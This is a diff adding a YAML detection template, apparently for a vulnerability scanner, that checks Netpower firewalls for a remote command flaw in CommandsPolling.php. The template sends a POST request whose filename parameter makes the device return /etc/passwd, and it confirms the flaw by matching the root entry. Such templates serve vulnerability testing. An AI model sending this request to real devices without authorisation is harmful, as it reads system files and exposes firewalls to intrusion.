@@ -1,0 +1,25 @@
+id:
+name: 网络设备_netpower_rce-CommandsPolling
+transport: http
+tags:
+  - NetpowerFireWall
+rules:
+  req:
+    request:
+      cache: true
+      follow_redirects: true
+      method: POST
+      path: /direct/polling/CommandsPolling.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+      body: command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
+    expression: response.status==200 && 'root:.*:0:0'.bmatches(response.body)
+expression: req()
+detail:
+  vulnerability:
+    proof:
+      info: "存在 网络设备_中科网威防火墙-rce-CommandsPolling 漏洞"
